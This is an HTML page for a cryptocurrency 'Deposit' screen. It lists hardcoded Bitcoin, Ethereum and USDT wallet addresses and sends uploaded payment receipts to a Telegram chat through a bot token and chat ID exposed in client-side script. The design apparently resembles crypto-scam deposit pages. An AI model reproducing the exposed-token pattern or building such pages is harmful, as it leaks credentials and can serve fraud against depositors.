<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
    />

    <title>Document</title>
  </head>
  <body>
    <style>
      @import url("https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap");

      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        font-family: "PT", Serif;
        scroll-behavior: smooth;
        list-style: none;
        text-decoration: none;
        font-family: "Poppins", sans-serif;
      }
      body {
        background-color: #333;
        width: 100%;
        height: 100vh;
        max-width: 1400px;
      }
      .header {
        position: fixed;
        z-index: 10;
        width: 100%;
        padding: 1% 3%;
        background-color: #222121;
      }
      .logo img {
        width: 150px;
      }
      .main {
        justify-content: center;
        align-items: center;
        overflow: hidden;
      }
      .deposit {
        padding: 5% 2%;
      }
      .deposit-content_container {
        padding: 0;
        margin-top: 7rem;
        display: flex;
        justify-content: center;
        align-content: center;
      }
      .deposit-header {
        position: fixed;
        padding: 3px 20px;
        border-radius: 7px 5px;
        background-color: #ffd700;
        left: -1%;
        top: 20%;
        display: flex;
        align-items: end;
      }
      .deposit_text {
        font-size: 17px;
        text-align: end;
      }
      .wallet-address {
        display: grid;
        margin-top: 1rem;
      }
      .address {
        padding: 2px;
        display: grid;
        justify-content: center;
        align-items: center;
      }
      .barcode {
        padding: 10px 10px;
        display: flex;
        justify-content: center;
      }
      .barcode .code {
        width: 300px;
        height: 270px;
        text-align: center;
      }
      .address-code {
        justify-content: center;
      }
      .copy-button-container {
        display: flex;
        justify-content: center;
        align-items: center;
      }
      .copy-button-mobile {
        display: none;
        min-width: 150px;
        padding: 5px 5px;
        border-radius: 10px;
        margin-bottom: 5px;
        background-color: #ffd700;
        text-align: center;
      }
      .copi {
        font-size: 17px;
        font-weight: 400;
      }
      .wallet-code-text {
        padding: 2px 2px;
        display: flex;
        justify-content: center;
        align-content: center;
        gap: 1rem;
        background-color: #ffd700;
        position: relative;
        min-width: 410px;
      }
      .wallet-code {
        font-weight: 300;
      }
      .copy_text {
        cursor: pointer;
        font-size: 15px;
        font-weight: 400;
        position: relative;
      }
      .tooltip-text {
        visibility: hidden;
        width: 70px; /* Adjust based on your content */
        background-color: black;
        color: #fff;
        text-align: center;
        border-radius: 5px;
        padding: 3px;
        font-size: 10px;
        position: absolute;
        z-index: 1;
        bottom: -7%; /* Position above the button */
        left: 50%;
        transform: translateX(20%);
        opacity: 0;
        transition: opacity 0.3s ease-in-out;
      }
      .copy_text:hover .tooltip-text {
        visibility: visible;
        opacity: 1;
      }

      .deposit-section{
        margin-top: 1rem;
        
      }
      .upload-reciept {
        justify-self: center;
      }

      .guide{
        color: #fff;
        font-size: 15px;
        text-align: center;
      }

      #customFileButton {
            display: inline-block;
            padding: 10px 15px;
            background-color: #ffd700;
            color: #000;
            font-weight: 400;
            border-radius: 10px;
            font-weight: 400;
            border: none;
            cursor: pointer;
            font-size: 16px;
        }

      .upload-reciept-parent {
        display: flex;
        justify-content: center;
        align-items: center;
        gap: 7px;
        margin-top: 5px;
      }

      #fileName{
        color: #fff;
        font-size: 15px;
      }

      #fileInput{
        display: none;
      }
      .upload-button-parent{
        display: flex;
        justify-content: center;
        margin-top: 1.3rem;
      }

      .submit-button {
        text-align: center;
        justify-self: center;
        padding: 10px 15px;
        border-radius: 15px;
        background-color: #ffd700;
        border: none;
        cursor: pointer;
        font-weight: 400;
      }

      @media screen and (max-width: 580px) {
        .deposit-content_container {
          margin-top: 10rem;
        }

        .wallet-code-text {
          display: none;
        }

        .copy-button-mobile {
          display: block;
        }

        .barcode .code {
          width: 260px;
          height: 250px;
        }
      }
    </style>
    <header class="header">
      <a href="#" class="logo">
        <img src="img/logo.png" alt="" />
      </a>
    </header>
    <main class="main">
      <section class="deposit">
        <div class="deposit-content_container">
          <div class="deposit-header">
            <h4 class="deposit_text">Deposit</h4>
          </div>
          <div class="wallet-address">
            <div class="address">
              <div class="barcode">
                <img src="img/BIT.jpg" alt="bitcoin" class="code" />
              </div>
              <div class="address-code">
                <div class="copy-button-container">
                  <div class="copy-button-mobile">
                    <span class="copi copy-bit"
                      >Copy Code <i class="fas fa-copy"></i
                    ></span>
                  </div>
                </div>
                <div class="wallet-code-text">
                  <h4 class="wallet-code bit-code">
                    bc1ql5pw2wqe79p3qy249vsm4rjekw67ea0v7p5t2s
                  </h4>
                  <span class="copy_text bit-copy">
                    <i class="fas fa-copy"></i>
                    <span class="tooltip-text">Copy Code</span>
                  </span>
                </div>
              </div>
            </div>
            <div class="address">
              <div class="barcode">
                <img src="img/ETH.jpg" alt="eth" class="code" />
              </div>
              <div class="address-code">
                <div class="copy-button-container">
                  <div class="copy-button-mobile">
                    <span class="copi copy-eth"
                      >Copy Code <i class="fas fa-copy"></i
                    ></span>
                  </div>
                </div>
                <div class="wallet-code-text">
                  <h4 class="wallet-code eth-code">
                    0xabc12b3c77147807037d792a250c13881ba35bb3
                  </h4>
                  <span class="copy_text eth-copy">
                    <i class="fas fa-copy"></i>
                    <span class="tooltip-text">Copy Code</span>
                  </span>
                </div>
              </div>
            </div>
            <div class="address">
              <div class="barcode">
                <img src="img/USDT.jpg" alt="usdt" class="code" />
              </div>
              <div class="address-code">
                <div class="copy-button-container">
                  <div class="copy-button-mobile">
                    <span class="copi copy-usdt"
                      >Copy Code <i class="fas fa-copy"></i
                    ></span>
                  </div>
                </div>
                <div class="wallet-code-text wallet-usdt">
                  <h4 class="wallet-code usdt-code">
                    TCmevzMKV62arnKZXjaKVAzN8b6vszA4hX
                  </h4>
                  <span class="copy_text usdt-copy">
                    <i class="fas fa-copy"></i>
                    <span class="tooltip-text">Copy Code</span>
                  </span>
                </div>
              </div>
            </div>
            <div class="deposit-section">
                <form id="uploadReciept">
                    <div class="upload-reciept">
                        <p class="guide">Use any of the address to make transactions</p>
                        <div class="upload-reciept-parent">
                        <label id="customFileButton" for="fileInput">Upload Reciept</label>
                        <span id="fileName">No reciept uploaded</span>
                        <input type="file" id="fileInput">
                    </div>
                    <div class="upload-button-parent">
                        <button class="submit-button" type="submit">I have Deposited</button>
                    </div>
                        
                    </div>
                </form>
            </div>
          </div>
            
        </div>
      </section>
    </main>
    <script>
      const copyCode = (element, text) => {
        const codeElement = document.querySelector(element);
        const code = document.querySelector(text);
        const textCode = code.textContent;
        codeElement.addEventListener("click", () => {
          navigator.clipboard.writeText(textCode);
          codeElement.innerHTML = "<i class='fas fa-check'></i>";
          /*                setInterval(()=> {
                    codeElement.textContent = "copy code" }, 1600); */
          setTimeout(
            () =>
              (codeElement.innerHTML =
                '<span class="copy_text eth-copy"> <i class="fas fa-copy"></i>  <span class="tooltip-text">Copy Code</span></span>'),
            1600
          );
        });
      };
      copyCode(".bit-copy", ".bit-code");
      copyCode(".eth-copy", ".eth-code");
      copyCode(".usdt-copy", ".usdt-code");

      const bitcoinCode = "bc1ql5pw2wqe79p3qy249vsm4rjekw67ea0v7p5t2s";
      const ethCode = "0xabc12b3c77147807037d792a250c13881ba35bb3";
      const usdtCode = "TCmevzMKV62arnKZXjaKVAzN8b6vszA4hX";

      function mobileCodeCopy(walletCode, elemt) {
        const mobileElement = document.querySelector(elemt);

        mobileElement.addEventListener("click", function () {
          navigator.clipboard.writeText(walletCode);
          mobileElement.innerHTML =
            '<span class="copi">Copied  <i class="fas fa-check"></i></span>';

          setTimeout(
            () =>
              (mobileElement.innerHTML =
                '<span class="copi">Copy Code  <i class="fas fa-copy"></i></span>'),
            1600
          );
        });
      }

      mobileCodeCopy(bitcoinCode, ".copy-bit");
      mobileCodeCopy(ethCode, ".copy-eth");
      mobileCodeCopy(usdtCode, ".copy-usdt");


      const fileInput = document.getElementById('fileInput');
        const fileNameDisplay = document.getElementById('fileName');
        const customButton = document.getElementById('customFileButton');

        // When the file input changes (a file is selected)
        fileInput.addEventListener('change', function() {
            if (fileInput.files.length > 0) {
                fileNameDisplay.textContent = fileInput.files[0].name; // Show the file name
            } else {
                fileNameDisplay.textContent = 'No file chosen';  // If no file is selected
            }
        });


        document.getElementById('uploadReciept').addEventListener('submit', function (e) {
            e.preventDefault();

            const fileInput = document.getElementById('fileInput');
            const file = fileInput.files[0];

            if (!file) {
                alert("Please select a file");
                return;
            }

            const formData = new FormData();
            formData.append('document', file);

            // Replace 'YOUR_BOT_TOKEN' with your Telegram bot token
            // Replace 'YOUR_CHAT_ID' with your Telegram chat ID
            const botToken = '7960200543:AAFTbQYL15K9t1WSZKUuCSvdsqD2H-I3WE0';
            const chatId = '5865177790';
            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}`;

            fetch(telegramApiUrl, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    alert('File uploaded successfully');
                } else {
                    alert('Failed to upload file');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('An error occurred while uploading the file');
            });
        });
    </script>
  </body>
</html>
